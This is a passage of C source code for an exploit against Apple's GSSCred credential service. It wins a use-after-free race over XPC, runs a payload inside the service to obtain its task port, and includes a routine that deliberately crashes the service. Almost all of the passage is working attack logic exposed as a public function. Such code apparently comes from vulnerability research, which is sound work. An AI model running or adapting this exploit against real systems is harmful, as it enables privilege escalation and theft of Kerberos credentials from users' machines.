	//         "kHEIMAttrType":   "kHEIMTypeKerberos",
	//         "kHEIMAttrUUID":   ab,
	//     },
	// }
	xpc_object_t delete_query   = xpc_dictionary_create(NULL, NULL, 0);
	xpc_object_t delete_request = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(delete_query, kHEIMAttrType, kHEIMTypeKerberos);
	xpc_dictionary_set_uuid(  delete_query, kHEIMAttrUUID, uuid);
	xpc_dictionary_set_string(delete_request, "command", "delete");
	xpc_dictionary_set_value( delete_request, "query",   delete_query);
	xpc_release(delete_query);
	state->delete_request = delete_request;
}

// Start a thread to listen for the message sent by the exploit payload running in GSSCred.
static void
gsscred_race_start_port_listener(struct gsscred_race_state *state) {
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
		// We want to wait for either of two events to occur: either we will receive a Mach
		// message from our exploit payload running inside of GSSCred, or we will never win
		// the race and gsscred_race_deinit() will be called. The latter destroys the Mach
		// port on which we're listening, so that's sufficient.
		struct {
			mach_msg_header_t  hdr;
			mach_msg_trailer_t trailer;
		} msg;
		// Loop until we get the task port.
		for (;;) {
			// Listen for a Mach message on the listener port.
			kern_return_t kr = mach_msg(&msg.hdr,
					MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE,
					0,
					sizeof(msg),
					state->listener_port,
					0,
					MACH_PORT_NULL);
			if (kr != KERN_SUCCESS) {
				// We are probably shutting down in gsscred_race_deinit(). Exit
				// this thread immediately, without touching state.
				ERROR("Receiving on Mach port listener returned %x", kr);
				return;
			}
			// Let the payload-specific message processor handle the message.
			mach_port_t gsscred_task, gsscred_thread;
			enum process_exploit_message_result result =
				gsscred_race_process_exploit_message(&msg.hdr,
					&gsscred_task, &gsscred_thread);
			if (result == PROCESS_EXPLOIT_MESSAGE_RESULT_CONTINUE) {
				continue;
			} else if (result == PROCESS_EXPLOIT_MESSAGE_RESULT_KILL_AND_RETRY) {
				WARNING("GSSCred is stuck in a bad state; "
						"trying to induce a crash");
				gsscred_race_crash(state);
				continue;
			}
			assert(result == PROCESS_EXPLOIT_MESSAGE_RESULT_SUCCESS);
			// Everything looks good! Save the task port, cancel the connection, and
			// exit. Cancelling the connection will cause the setattributes reply
			// handler in gsscred_race_setattributes_async() to be invoked with
			// XPC_ERROR_CONNECTION_INVALID if it hasn't fired already.
			DEBUG_TRACE(1, "Got GSSCred task port: %x", gsscred_task);
			state->gsscred_task_port   = gsscred_task;
			state->gsscred_thread_port = gsscred_thread;
			xpc_connection_cancel(state->setattributes_connection);
			return;
		}
	});
}

// Initialize the state for exploiting the GSSCred race condition.
static bool
gsscred_race_init(struct gsscred_race_state *state) {
	bzero(state, sizeof(*state));
	// Generate the UAF string and the exploit payload. The UAF string is the string that will
	// be deserialized repeatedly in the hope that it overwrites the freed HeimCred, causing
	// various object accesses to redirect to our exploit payload and eventually triggering
	// controlled execution from the payload.
	char uaf_string[GSSCRED_RACE_UAF_STRING_SIZE];
	uint8_t payload[GSSCRED_RACE_PAYLOAD_SIZE];
	bool success = gsscred_race_build_exploit_payload(uaf_string, payload);
	if (!success) {
		return false;
	}
	// Initialize the race state.
	gsscred_race_create_listener_port(state);
	gsscred_race_build_requests(state, uaf_string, payload);
	state->setattributes_reply_done = dispatch_semaphore_create(0);
	gsscred_race_start_port_listener(state);
	return true;
}

// Clean up all resources used by the GSSCred race state.
static void
gsscred_race_deinit(struct gsscred_race_state *state) {
	xpc_release(state->create_request);
	xpc_release(state->setattributes_request);
	xpc_release(state->delete_request);
	mach_port_destroy(mach_task_self(), state->listener_port);
	dispatch_release(state->setattributes_reply_done);
}

// Generate a connection to GSSCred with the specified event handler.
static xpc_connection_t
gsscred_xpc_connect(xpc_handler_t handler) {
	xpc_connection_t connection
		= xpc_connection_create_mach_service(GSSCRED_SERVICE_NAME, NULL, 0);
	assert(connection != NULL);
	xpc_connection_set_event_handler(connection, handler);
	xpc_connection_activate(connection);
	return connection;
}

// Check whether the given event indicates that the connection was interrupted, and if so, set the
// interrupted flag.
static void
gsscred_race_check_interrupted(struct gsscred_race_state *state, xpc_object_t event) {
	if (event == XPC_ERROR_CONNECTION_INTERRUPTED) {
		state->connection_interrupted = true;
	}
}

// Create all the GSSCred connections.
static void
gsscred_race_open_connections(struct gsscred_race_state *state) {
	// Create the connection on which we will send the setattributes message.
	state->setattributes_connection = gsscred_xpc_connect(^(xpc_object_t event) {
		gsscred_race_check_interrupted(state, event);
#if DEBUG_LEVEL(3)
		char *desc = xpc_copy_description(event);
		DEBUG_TRACE(3, "setattributes connection event: %s", desc);
		free(desc);
#endif
	});
	// Create the connection on which we will send the delete message.
	state->delete_connection = gsscred_xpc_connect(^(xpc_object_t event) {
		gsscred_race_check_interrupted(state, event);
#if DEBUG_LEVEL(3)
		char *desc = xpc_copy_description(event);
		DEBUG_TRACE(3, "delete connection event: %s", desc);
		free(desc);
#endif
	});
	// Initialize state variables for the connections.
	state->connection_interrupted = false;
}

// Close all the GSSCred connections.
static void
gsscred_race_close_connections(struct gsscred_race_state *state) {
	xpc_connection_cancel(state->setattributes_connection);
	xpc_connection_cancel(state->delete_connection);
	xpc_release(state->setattributes_connection);
	xpc_release(state->delete_connection);
}

// Send the credential creation request to GSSCred.
static bool
gsscred_race_create_credential_sync(struct gsscred_race_state *state) {
	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
			state->delete_connection,
			state->create_request);
#if DEBUG_LEVEL(3)
	char *desc = xpc_copy_description(reply);
	DEBUG_TRACE(3, "create reply: %s", desc);
	free(desc);
#endif
	bool success = (xpc_dictionary_get_value(reply, "error") == NULL);
	xpc_release(reply);
	return success;
}

// Send the setattributes request asynchronously. This will cause do_SetAttrs() to stall in
// HeimCredMessageCopyAttributes() for awhile (hopefully around 10 milliseconds) while it
// continuously allocates CFString objects.
static void
gsscred_race_setattributes_async(struct gsscred_race_state *state) {
	// Send the setattributes message asynchronously.
	xpc_connection_send_message_with_reply(
			state->setattributes_connection,
			state->setattributes_request,
			NULL,
			^(xpc_object_t reply) {
		gsscred_race_check_interrupted(state, reply);
		dispatch_semaphore_signal(state->setattributes_reply_done);
#if DEBUG_LEVEL(3)
		// We never expect feedback.
		char *desc = xpc_copy_description(reply);
		DEBUG_TRACE(3, "setattributes reply: %s", desc);
		free(desc);
		assert(xpc_dictionary_get_value(reply, "error") == NULL);
#endif
	});
}

// Send the delete request synchronously. This will cause the target credential to be deleted
// and hopefully allow it to be reallocated as a CFString for setattributes.
static void
gsscred_race_delete_credential_sync(struct gsscred_race_state *state) {
	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
			state->delete_connection,
			state->delete_request);
#if DEBUG_LEVEL(3)
	char *desc = xpc_copy_description(reply);
	DEBUG_TRACE(3, "delete reply: %s", desc);
	free(desc);
#endif
	xpc_release(reply);
}

// Try to crash the GSSCred process.
static void
gsscred_race_crash(struct gsscred_race_state *state) {
	gsscred_race_create_credential_sync(state);
	xpc_object_t crash_request = xpc_dictionary_create(NULL, NULL, 0);
	const uint8_t *uuid = xpc_dictionary_get_uuid(state->setattributes_request, "uuid");
	xpc_dictionary_set_string(crash_request, "command", "move");
	xpc_dictionary_set_uuid(  crash_request, "from",    uuid);
	xpc_dictionary_set_uuid(  crash_request, "to",      uuid);
	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(
			state->delete_connection, crash_request);
	xpc_release(reply);
}

// Wait for all asynchronous messages to finish.
static void
gsscred_race_synchronize(struct gsscred_race_state *state) {
	// We're only waiting for setattributes; all other requests are synchronous.
	dispatch_semaphore_wait(state->setattributes_reply_done, DISPATCH_TIME_FOREVER);
}

// Run the race condition.
static bool
gsscred_race_run(struct gsscred_race_state *state) {
	bool done = false;
	// Open the connections to the GSSCred service.
	gsscred_race_open_connections(state);
	// First send a delete message to make sure GSSCred is up and running, then give it time to
	// initialize.
	gsscred_race_delete_credential_sync(state);
	sleep(1);
	// Initialize the delay between setattributes and delete.
	state->setattributes_to_delete_delay = INITIAL_SETATTRIBUTES_TO_DELETE_DELAY_US;
	// Loop until we win.
	for (size_t try = 1;; try++) {
		DEBUG_TRACE(1, "Trying delay %u", state->setattributes_to_delete_delay);
		// Create the credential synchronously.
		bool ok = gsscred_race_create_credential_sync(state);
		if (!ok) {
			ERROR("Could not create the credential");
			done = true;
			break;
		}
		// Wait a little while after creating the credential for GSSCred's allocator to
		// calm down. Probably not necessary, but better safe than sorry.
		usleep(POST_CREATE_CREDENTIAL_DELAY);
		// Send the setattributes request asynchronously. do_SetAttrs() will store a
		// pointer to the target credential on the stack and then loop continuously
		// allocating memory. The reuse of this pointer later in the function is the UAF,
		// and our race window is however long do_SetAttrs() spends in the allocation loop.
		gsscred_race_setattributes_async(state);
		// Sleep for awhile, until there's a good chance that the delete request will
		// arrive in the middle of the race window.
		usleep(state->setattributes_to_delete_delay);
		// Send the delete message synchronously.
		gsscred_race_delete_credential_sync(state);
		// Wait for the setattributes request to finish.
		gsscred_race_synchronize(state);
		// If we got a task port, then we're done!
		if (state->gsscred_task_port != MACH_PORT_NULL) {
			DEBUG_TRACE(1, "Success! Won the race after %zu %s", try,
					(try == 1 ? "try" : "tries"));
			done = true;
			break;
		}
		// If we got a Connection Interrupted error, then we crashed GSSCred.
		if (state->connection_interrupted) {
			WARNING("Crash!");
			DEBUG_TRACE(1, "Won the race after %zu %s, but failed to get "
					"GSSCred task port", try, (try == 1 ? "try" : "tries"));
			break;
		}
		DEBUG_TRACE(2, "Lost the race, trying again...");
		// If we've run out of tries, give up.
		if (try >= MAX_TRIES_TO_WIN_THE_RACE) {
			WARNING("Could not win the race after %zu tries", try);
			break;
		}
		// Increase the delay.
		state->setattributes_to_delete_delay += SETATTRIBUTES_TO_DELETE_DELAY_INCREMENT_US;
		// If we didn't get a Connection Interrupted error, then GSSCred is still running.
		// Sleep for awhile to let GSSCred settle down, then try again.
		usleep(RETRY_RACE_DELAY);
	}
	// Close the connections to GSSCred.
	gsscred_race_close_connections(state);
	// Return whether we should stop trying.
	return done;
}

// ---- Public API --------------------------------------------------------------------------------

bool
gsscred_race(mach_port_t *gsscred_task_port, mach_port_t *gsscred_thread_port) {
	DEBUG_TRACE(1, "gsscred_race");
	struct gsscred_race_state state;
	// Initialize the race state.
	bool success = gsscred_race_init(&state);
	if (!success) {
		goto fail;
	}
	// Repeatedly try to win the race condition and execute our exploit payload.
	for (size_t try = 1;; try++) {
		// Try to win the race condition. If we succeed or encounter a fatal error, abort.
		bool done = gsscred_race_run(&state);
		if (done) {
			break;
		}
		// If we've tried and failed too many times, give up.
		if (try >= MAX_TRIES_TO_GET_TASK_PORT) {
			ERROR("Could not get GSSCred's task port after %zu %s",
					try, (try == 1 ? "try" : "tries"));
			break;
		}
	}
	// Clean up all race state.
	gsscred_race_deinit(&state);
	// Return the GSSCred task port, if we managed to get it.
fail:
	*gsscred_task_port   = state.gsscred_task_port;
	*gsscred_thread_port = state.gsscred_thread_port;
	return (state.gsscred_task_port != MACH_PORT_NULL);
}
